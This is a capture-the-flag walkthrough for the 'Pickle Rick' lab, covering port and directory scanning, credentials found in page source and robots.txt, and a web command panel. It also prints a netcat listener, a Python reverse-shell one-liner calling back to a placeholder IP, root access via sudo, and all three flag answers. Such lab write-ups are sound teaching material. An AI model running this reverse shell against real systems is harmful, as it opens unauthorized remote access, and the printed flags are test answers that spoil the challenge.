# Pickle Rick CTF Walkthrough

This is a walkthrough for the Pickle Rick CTF challenge. The goal was to help Rick by finding three secret ingredients on the vulnerable web server.
![](https://maxschmittlaurin.github.io/assets/rick.PNG)

---

## 1. Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

### Gobuster Scan
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/big.txt
```

**Discovered:**
- `/robots.txt`
- `/login.php`

---

## 2. Information Gathering

- Navigated to the IP in browser.
- Inspected page source and found:
  - Username: `R1ckRul3s`
- Accessed /robots.txt and found:
  - Password: `wubbalubbadubdub`

---

## 3. Login and Initial Shell Access

- Used credentials to log in to `/login.php`:
  - **Username**: `R1ckRul3s`
  - **Password**: `wubbalubbadubdub`
- Upon login, got a basic web-based command shell.

---

## 4. File Discovery

- Ran `ls` and `grep . <file name>` (cat and head command was blocked)
-  found the first secret ingredient:
  ```
  1st Ingredient: Mr. Meeseeks Hair
  ```

---

## 5. Python Availability Check

- Checked for Python3:
  ```bash
  python3 -c 'print("hello")'
  ```
- Confirmed Python3 was available.

---

## 6. Python Reverse Shell

Started a netcat listener on my machine:
```bash
nc -lvnp 4444
```

Executed the reverse shell command via web shell:
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```

- Got a reverse shell back.

---

## 7. Privilege Escalation

- Escalated to root without any advanced techniques.
- just by typing `sudo su`

---

## 8. Ingredients Collection

- Found the second ingredient in `/home/rick`:
  ```
  2nd Ingredient: 1 Jerry Tear
  ```

- Found the final ingredient in `/root`:
  ```
  3rd Ingredient: Fleeb Juice
  ```

---

## Conclusion

Successfully exploited the web server and helped Rick by collecting all three ingredients.

Mission accomplished.
